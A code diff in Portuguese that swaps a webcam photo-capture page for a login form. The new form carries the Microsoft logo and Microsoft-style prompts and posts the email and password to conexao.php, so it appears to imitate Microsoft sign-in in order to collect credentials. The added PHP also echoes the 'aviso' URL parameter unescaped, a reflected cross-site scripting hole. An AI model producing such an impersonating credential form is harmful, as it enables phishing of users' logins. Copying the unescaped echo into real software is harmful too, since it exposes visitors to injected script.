@@ -1,147 +1,91 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head> 
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capturar e Analisar Foto</title>
+    <title>Login - Meu Sistema</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            background-color: #f4f4f9;
             height: 100vh;
-            margin: 0;
+            background-color: #f3f3f3;
         }
-        h1 {
-            color: #333;
-        }
-        .container {
-            position: relative;
-            text-align: center;
-        }
-        canvas {
-            border: 2px solid #333;
+        .login-container {
+            background: white;
+            padding: 2rem;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
+            text-align: center;
+            width: 320px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-        .button-container {
+        .login-container img {
+            width: 150px;
+            margin-bottom: 1rem;
+        }
+        .login-container h2 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            font-weight: 400;
+        }
+        form {
             display: flex;
             flex-direction: column;
             align-items: center;
             width: 100%;
         }
-        button {
-            width: 640px;
-            height: 50px;
-            margin-top: 10px;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #4CAF50;
+        .input-field {
+            width: 90%;
+            padding: 10px;
+            margin-bottom: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        .login-btn {
+            width: 90%;
+            padding: 10px;
+            background: #0078D4;
             color: white;
             border: none;
             border-radius: 5px;
-            transition: background-color 0.3s;
+            font-size: 1rem;
+            cursor: pointer;
         }
-        button:hover {
-            background-color: #45a049;
+        .login-btn:hover {
+            background: #005A9E;
         }
-        .loading {
-            display: none;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 20px;
-            color: rgb(255, 0, 0);
-            background: rgba(255, 255, 255, 0.7);
-            padding: 10px;
-            border-radius: 5px;
+        .forgot-password {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: #0078D4;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1><strong>CAPTURAR E ANALISAR</strong></h1>
-        <div id="loading" class="loading"><strong>PROCESSANDO... POR FAVOR AGUARDE!!!</strong></div>
-        <canvas id="canvas" width="640" height="480"></canvas>
-        <div class="button-container">
-            <button id="capturar">CAPTURAR E ANALISAR</button>
-            <button id="cadastrar">CADASTRAR IMAGEM</button>
-            <button id="excluir">EXCLUIR IMAGEM</button>
-        </div>
+
+    <div class="login-container">
+
+        <?php
+        if(isset($_GET["aviso"])){
+             echo $_GET["aviso"];
+        }
+        ?>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+        <h2>Login</h2>
+        <form action="conexao.php" method="POST">
+            <input type="text" name="email" class="input-field" placeholder="E-mail ou telefone" required>
+            <input type="password" name="password" class="input-field" placeholder="Senha" required>
+            <button type="submit" class="login-btn">Entrar</button>
+        </form>
+        <a href="#" class="forgot-password">Esqueceu a senha?</a>
     </div>
-
-    <script>
-        const video = document.createElement("video");
-        video.setAttribute("autoplay", "");
-        video.setAttribute("playsinline", ""); 
-
-        const canvas = document.getElementById("canvas");
-        const context = canvas.getContext("2d");
-
-        const capturarBtn = document.getElementById("capturar");
-        const cadastrarBtn = document.getElementById("cadastrar");
-        const excluirBtn = document.getElementById("excluir");
-        const loadingDiv = document.getElementById("loading");
-
-        // Iniciar a webcam
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                requestAnimationFrame(atualizarCanvas);
-            })
-            .catch(err => { console.error("Erro ao acessar a webcam", err); });
-
-        function atualizarCanvas() {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Definir as dimensões do retângulo de referência
-            const rectWidth = 250;
-            const rectHeight = 350;
-            const x = (canvas.width - rectWidth) / 2;
-            const y = (canvas.height - rectHeight) / 2;
-
-            // Desenhar o retângulo vermelho apenas na visualização
-            context.strokeStyle = "red";
-            context.lineWidth = 2;
-            context.strokeRect(x, y, rectWidth, rectHeight);
-
-            requestAnimationFrame(atualizarCanvas);
-        }
-
-        function enviarImagem(url) {
-            loadingDiv.style.display = 'block';
-            const canvasOculto = document.createElement("canvas");
-            canvasOculto.width = 640;
-            canvasOculto.height = 480;
-            const contextOculto = canvasOculto.getContext("2d");
-            contextOculto.drawImage(video, 0, 0, canvasOculto.width, canvasOculto.height);
-            const dataUrl = canvasOculto.toDataURL("image/png");
-
-            fetch(url, {
-                method: "POST",
-                body: JSON.stringify({ imagem: dataUrl }),
-                headers: { "Content-Type": "application/json" }
-            })
-            .then(response => response.text())
-            .then(data => { window.location.href = data; })
-            .catch(error => {
-                console.error("Erro:", error);
-                alert("Ocorreu um erro ao processar a imagem.");
-            })
-            .finally(() => {
-                loadingDiv.style.display = 'none';
-            });
-        }
-
-        capturarBtn.addEventListener("click", () => enviarImagem("salvar_foto.php"));
-        cadastrarBtn.addEventListener("click", () => window.location.href = "cad_imagem.php");
-        excluirBtn.addEventListener("click", () => window.location.href = "exc_imagem.php");
-    </script>
-
 </body>
 </html>
